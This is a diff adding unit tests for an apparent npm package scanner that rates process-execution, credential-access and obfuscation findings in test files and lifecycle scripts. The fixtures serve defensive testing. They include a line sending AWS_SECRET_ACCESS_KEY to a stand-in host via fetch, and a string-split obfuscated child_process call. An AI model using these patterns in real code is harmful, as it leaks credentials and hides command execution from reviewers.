@@ -1129,3 +1129,236 @@ describe("computeRisk weighted multi-signal roll-up (issue #193)", () => {
     expect(computeRisk([])).toBe("low");
   });
 });
+
+describe("test-scoped capability findings", () => {
+  const pkg = (main = "index.js") => ({
+    path: "package.json",
+    size: 60,
+    sha256: "pkg",
+    flags: [],
+    textSample: JSON.stringify({ name: "pkg", version: "1.0.0", main }),
+  });
+  const file = (path, textSample) => ({ path, size: 60, sha256: path, flags: [], textSample });
+
+  test("demotes capability findings in unreachable test files and marks them test-scoped", () => {
+    const staged = [
+      pkg(),
+      file("index.js", "module.exports = {};\n"),
+      file(
+        "test/spawn.js",
+        "const { execSync } = require('child_process');\nexecSync('node -v');\n",
+      ),
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
+    const processExec = findings.find((finding) => finding.ruleId === "code.process-execution");
+    expect(processExec).toMatchObject({
+      file: "test/spawn.js",
+      severity: "medium",
+      testScoped: true,
+    });
+    expect(processExec.evidence).toContain("test-scoped");
+  });
+
+  test("keeps full severity when the test file is reachable from the entrypoint", () => {
+    const staged = [
+      pkg(),
+      file("index.js", "require('./test/spawn.js');\n"),
+      file(
+        "test/spawn.js",
+        "const { execSync } = require('child_process');\nexecSync('node -v');\n",
+      ),
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
+    expect(findings.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
+      file: "test/spawn.js",
+      severity: "high",
+    });
+  });
+
+  test("keeps full severity when a lifecycle script points into the test tree", () => {
+    const staged = [
+      {
+        path: "package.json",
+        size: 120,
+        sha256: "pkg",
+        flags: [],
+        textSample: JSON.stringify({
+          name: "pkg",
+          version: "1.0.0",
+          main: "index.js",
+          scripts: { postinstall: "node test/setup.js" },
+        }),
+      },
+      file("index.js", "module.exports = {};\n"),
+      file(
+        "test/setup.js",
+        "const { execSync } = require('child_process');\nexecSync('node -v');\n",
+      ),
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
+    expect(findings.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
+      file: "test/setup.js",
+      severity: "high",
+    });
+  });
+
+  test("keeps full severity for files transitively imported by a lifecycle script", () => {
+    const staged = [
+      {
+        path: "package.json",
+        size: 120,
+        sha256: "pkg",
+        flags: [],
+        textSample: JSON.stringify({
+          name: "pkg",
+          version: "1.0.0",
+          main: "index.js",
+          scripts: { postinstall: "node test/setup.js" },
+        }),
+      },
+      file("index.js", "module.exports = {};\n"),
+      file("test/setup.js", "require('./helper.js');\n"),
+      file(
+        "test/helper.js",
+        "const { execSync } = require('child_process');\nexecSync('node -v');\n",
+      ),
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
+    expect(findings.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
+      file: "test/helper.js",
+      severity: "high",
+    });
+  });
+
+  test("keeps full severity for obfuscated capabilities even in test files", () => {
+    const staged = [
+      pkg(),
+      file("index.js", "module.exports = {};\n"),
+      file(
+        "test/hidden.js",
+        "const m = require(['chi', 'ld_pro', 'cess'].join(''));\nm['exec' + 'Sync']('node -v');\n",
+      ),
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
+    expect(findings.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
+      file: "test/hidden.js",
+      severity: "high",
+      obfuscated: true,
+    });
+  });
+
+  test("keeps a same-file credential→network exfiltration chain at full severity in test files", () => {
+    const staged = [
+      pkg(),
+      file("index.js", "module.exports = {};\n"),
+      file(
+        "test/exfil.js",
+        "const env = process.env.AWS_SECRET_ACCESS_KEY;\nfetch('https://example.invalid', { body: env });\n",
+      ),
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff(staged, staged));
+    expect(findings.find((finding) => finding.ruleId === "code.credential-access")).toMatchObject({
+      file: "test/exfil.js",
+      severity: "high",
+    });
+  });
+
+  test("test-scoped capabilities do not co-occur into a high risk roll-up", () => {
+    const testScoped = (ruleId, severity) => ({
+      ruleId,
+      severity,
+      file: "test/a.js",
+      testScoped: true,
+    });
+    expect(
+      computeRisk([
+        testScoped("code.process-execution", "medium"),
+        testScoped("code.credential-access", "low"),
+        testScoped("code.dynamic-evaluation", "low"),
+      ]),
+    ).toBe("low");
+    // A non-test capability still escalates against another non-test capability.
+    expect(
+      computeRisk([
+        { ruleId: "code.network-access", severity: "medium", file: "index.js" },
+        { ruleId: "code.credential-access", severity: "medium", file: "index.js" },
+        testScoped("code.process-execution", "medium"),
+      ]),
+    ).toBe("high");
+  });
+});
+
+describe("baseline finding fingerprints", () => {
+  test("keeps a line-less modified-file finding contextual when the baseline already fired the same rule", () => {
+    const previous = [
+      {
+        path: "lib/util.js",
+        size: 60,
+        sha256: "old",
+        flags: [],
+        textSample: "const { execSync } = require('child_process');\nexecSync('node -v');\n",
+      },
+    ];
+    const staged = [
+      {
+        path: "lib/util.js",
+        size: 70,
+        sha256: "new",
+        flags: [],
+        textSample:
+          "const { execSync } = require('child_process');\nexecSync('node -v');\n// touched\n",
+      },
+    ];
+    const diff = createPackageDiff(previous, staged);
+    const annotated = annotateFindingsWithDiffStatus(
+      [
+        {
+          severity: "high",
+          file: "lib/util.js",
+          evidence: "process or shell execution",
+          reason: "package may execute arbitrary commands",
+          ruleId: "code.process-execution",
+        },
+      ],
+      diff,
+      { previousFiles: previous, stagedFiles: staged },
+    );
+    expect(annotated[0]).toMatchObject({ diffStatus: "modified", releaseDelta: false });
+  });
+
+  test("fails open to release delta when the baseline has no matching finding", () => {
+    const previous = [
+      {
+        path: "lib/util.js",
+        size: 60,
+        sha256: "old",
+        flags: [],
+        textSample: "export const a = 1;\n",
+      },
+    ];
+    const staged = [
+      {
+        path: "lib/util.js",
+        size: 70,
+        sha256: "new",
+        flags: [],
+        textSample: "export const a = 2;\n",
+      },
+    ];
+    const diff = createPackageDiff(previous, staged);
+    const annotated = annotateFindingsWithDiffStatus(
+      [
+        {
+          severity: "high",
+          file: "lib/util.js",
+          evidence: "process or shell execution",
+          reason: "package may execute arbitrary commands",
+          ruleId: "code.process-execution",
+        },
+      ],
+      diff,
+      { previousFiles: previous, stagedFiles: staged },
+    );
+    expect(annotated[0]).toMatchObject({ diffStatus: "modified", releaseDelta: true });
+  });
+});
